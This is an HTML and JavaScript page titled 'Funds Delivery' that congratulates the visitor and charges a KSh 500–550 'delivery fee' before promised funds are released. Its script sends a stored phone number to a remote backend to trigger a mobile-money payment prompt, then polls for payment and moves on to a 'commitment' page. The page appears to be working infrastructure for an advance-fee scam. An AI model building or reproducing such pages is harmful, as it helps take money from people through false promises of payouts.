<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Funds Delivery</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:Arial,sans-serif;
    background:#f4f7f8;
    color:#222;
}

.container{
    width:92%;
    max-width:480px;
    margin:auto;
}

header{
    background:#087f3e;
    color:white;
    padding:20px 0;
}

header h1{
    font-size:22px;
}

.card{
    background:white;
    margin:18px 0;
    padding:22px 20px;
    border-radius:14px;
    box-shadow:0 2px 10px rgba(0,0,0,.07);
}

.card h2{
    font-size:22px;
    margin-bottom:10px;
}

.card p{
    color:#666;
    line-height:1.5;
    margin-bottom:20px;
}

.delivery-option{
    display:block;
    border:1px solid #ddd;
    border-radius:10px;
    padding:15px;
    margin-bottom:12px;
    cursor:pointer;
}

.delivery-option input{
    margin-right:8px;
}

.method{
    font-weight:700;
}

.fee{
    color:#666;
    font-size:14px;
    margin-top:5px;
}

.selected-fee{
    background:#f4f7f8;
    padding:14px;
    border-radius:10px;
    margin:18px 0;
}

.btn{
    width:100%;
    padding:15px;
    border:0;
    border-radius:9px;
    background:#087f3e;
    color:white;
    font-size:16px;
    font-weight:700;
    cursor:pointer;
}

.btn:disabled{
    opacity:.6;
    cursor:not-allowed;
}

#status{
    text-align:center;
    margin-top:15px;
    font-size:14px;
}

footer{
    text-align:center;
    padding:25px 10px;
    color:#777;
    font-size:12px;
}
</style>
</head>

<body>

<header>
    <div class="container">
        <h1>Funds Delivery</h1>
    </div>
</header>

<main class="container">

    <section class="card">

        <h2>Congratulations!</h2>

        <p>
            Kindly choose where you would like your funds transferred.
            Each delivery method has a small fee to cover applicable
            network and processing charges.
        </p>

        <label class="delivery-option">
            <input
                type="radio"
                name="delivery"
                value="500"
                onchange="updateFee()"
            >

            <span class="method">Mobile Money</span>

            <div class="fee">
                Delivery charge: KSh 500
            </div>
        </label>

        <label class="delivery-option">
            <input
                type="radio"
                name="delivery"
                value="550"
                onchange="updateFee()"
            >

            <span class="method">Bank Account</span>

            <div class="fee">
                Delivery charge: KSh 550
            </div>
        </label>

        <div class="selected-fee">
            Delivery Fee:
            <strong>KSh <span id="deliveryFee">0</span></strong>
        </div>

        <button
            type="button"
            id="payButton"
            class="btn"
            onclick="payDelivery()"
        >
            Pay Delivery Charges
        </button>

        <div id="status"></div>

    </section>

</main>

<footer>
    Please review the selected delivery method and applicable charge
    before making payment.
</footer>

<script>

function updateFee(){

    const selected =
        document.querySelector(
            'input[name="delivery"]:checked'
        );

    if(selected){

        document.getElementById("deliveryFee").innerText =
            selected.value;

    }

}

async function payDelivery(){

    const selected =
        document.querySelector(
            'input[name="delivery"]:checked'
        );

    if(!selected){

        alert("Please select a delivery method.");

        return;
    }

    const phone =
        localStorage.getItem("phoneNumber");

    if(!phone){

        alert("Phone number not found.");

        return;
    }

    const amount =
        Number(selected.value);

    const status =
        document.getElementById("status");

    const button =
        document.getElementById("payButton");

    button.disabled = true;
    button.innerText = "Processing...";

    status.innerText =
        "Sending payment request...";

    try{

        const response =
            await fetch(
                "https://nyota-funds-backend.onrender.com/stk-push",
                {
                    method:"POST",

                    headers:{
                        "Content-Type":"application/json"
                    },

                    body:JSON.stringify({
                        phone:phone,
                        amount:amount
                    })
                }
            );

        const data =
            await response.json();

        console.log("PAYMENT RESPONSE:", data);

        if(!response.ok){

            throw new Error(
                data.message ||
                "Payment request failed"
            );

        }

        const transactionId =
            data.transactionId ||
            data.checkout_request_id ||
            data.data?.transactionId ||
            data.data?.checkout_request_id;

        if(!transactionId){

            throw new Error(
                "Payment reference was not returned."
            );

        }

        status.innerText =
            "Payment request sent. Please follow the instructions on your phone.";

        checkPayment(transactionId);

    }catch(error){

        console.error("PAYMENT ERROR:", error);

        button.disabled = false;
        button.innerText =
            "Pay Delivery Charges";

        status.innerText =
            "Payment request failed.";

    }

}

function checkPayment(transactionId){

    const interval =
        setInterval(async()=>{

            try{

                const response =
                    await fetch(
                        "https://nyota-funds-backend.onrender.com/payment-status",
                        {
                            method:"POST",

                            headers:{
                                "Content-Type":"application/json"
                            },

                            body:JSON.stringify({

                                checkout_request_id:
                                    transactionId,

                                transactionId:
                                    transactionId,

                                transaction_id:
                                    transactionId

                            })
                        }
                    );

                const result =
                    await response.json();

                console.log(
                    "PAYMENT STATUS:",
                    result
                );

                const paymentStatus =
                    String(
                        result.status ||
                        result.data?.status ||
                        result.data?.data?.status ||
                        ""
                    ).toLowerCase();

                if(
                    paymentStatus === "completed" ||
                    paymentStatus === "success"
                ){

                    clearInterval(interval);

                    document.getElementById("status").innerText =
                        "Payment confirmed successfully.";

                    setTimeout(()=>{

                        window.location.href =
                            "commitment.html";

                    },1000);

                }

                else if(
                    paymentStatus === "cancelled" ||
                    paymentStatus === "failed"
                ){

                    clearInterval(interval);

                    document.getElementById("status").innerText =
                        "Payment was not completed.";

                    const button =
                        document.getElementById("payButton");

                    button.disabled = false;
                    button.innerText =
                        "Pay Delivery Charges";

                }

                else{

                    document.getElementById("status").innerText =
                        "Confirming payment...";

                }

            }catch(error){

                console.error(
                    "STATUS ERROR:",
                    error
                );

            }

        },3000);

}

</script>

</body>
</html>
